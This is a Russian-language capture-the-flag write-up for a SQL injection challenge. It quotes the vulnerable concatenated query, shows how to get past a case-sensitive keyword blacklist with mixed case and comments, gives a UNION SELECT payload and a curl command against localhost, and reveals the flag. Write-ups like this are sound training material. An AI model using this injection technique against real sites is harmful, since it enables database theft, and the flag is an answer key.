# CTFCoin L3 — Writeup

## Идея
На главной странице показывается список монет, а при отправке формы на `/check_crypto` сервер строит SQL-запрос так:

```python
query = "select crypto_price from cryptocurrency where crypto_name LIKE '" + crypto + "';"
```

Т.е. параметр `cryptoname` подставляется в SQL **без параметризации** → классическая **SQL-инъекция**.

Есть функция `check_sql()`, которая пытается блокировать подстроки `select/union/from` (только в нижнем и верхнем регистрах), но это легко обходится смешанным регистром и комментариями.

## Эксплуатация
1) Отправляем запрос вручную (через Burp/curl), т.к. в UI можно выбрать только радиокнопки.

2) Закрываем кавычку, делаем `UNION SELECT` и комментируем хвост запроса.

Фильтр блокирует только `select`, `SELECT`, `union`, `UNION`, `from`, `FROM`.
Поэтому используем, например, `SeLeCt`, `uNiOn`, `fRoM`.

### Достаём флаг
Флаг лежит в таблице `bank_admin_info` в колонке `flag`.

Payload (без пробелов, чтобы было проще):

```
'/**/uNiOn/**/SeLeCt/**/flag/**/fRoM/**/bank_admin_info#
```

Пример:

```bash
curl -s -X POST http://localhost:5000/check_crypto \
  -d "cryptoname='/**/uNiOn/**/SeLeCt/**/flag/**/fRoM/**/bank_admin_info#" \
  | grep -o 'FECTF{[^}]*}'
```

Сервер вернёт значение как будто это `crypto_price`, и оно отобразится на странице.

## Флаг
`FECTF{ctfcoin_sqli_blacklist_bypass}`
